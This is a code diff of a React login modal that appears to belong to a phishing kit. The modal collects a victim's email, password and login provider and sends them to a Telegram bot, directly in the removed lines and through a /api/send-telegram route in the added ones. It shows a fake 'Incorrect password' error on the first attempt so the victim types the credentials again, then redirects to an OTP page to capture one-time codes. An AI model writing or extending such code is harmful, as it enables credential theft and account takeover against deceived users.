@@ -17,46 +17,40 @@ export default function LoginModal({ provider, onClose, clickCount, setClickCoun
   const [error, setError] = useState<string | null>(null);
   const router = useRouter();
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    const newClickCount = clickCount + 1;
-    setClickCount(newClickCount);
+ const handleSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
 
-    if (!email || !password) {
-      setError("Email and password are required.");
-      return;
+  const newClickCount = clickCount + 1;
+  setClickCount(newClickCount);
+
+  if (!email || !password) {
+    setError("Email and password are required.");
+    return;
+  }
+
+  try {
+    const res = await fetch("/api/send-telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password, provider }),
+    });
+
+    const data = await res.json();
+
+    if (!res.ok) {
+      throw new Error(data?.description || data?.error || `HTTP ${res.status}`);
     }
 
-    const message = `🔐 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}`;
-
-    try {
-      const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown",
-          }),
-        }
-      );
-
-      if (newClickCount === 1) {
-        setError("Incorrect password. Please try again.");
-      } else if (telegramResponse.ok) {
-        router.push("/otp");
-      } else {
-        const data = await telegramResponse.json();
-        setError(data.description || "Telegram message failed.");
-      }
-    } catch (err) {
-      setError("Network error. Try again later.");
+    if (newClickCount === 1) {
+      setError("Incorrect password. Please try again.");
+    } else {
+      router.push("/otp");
     }
-  };
+  } catch (err: any) {
+    console.error("Submit error:", err.message);
+    setError("Network error. Try again later.");
+  }
+};
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
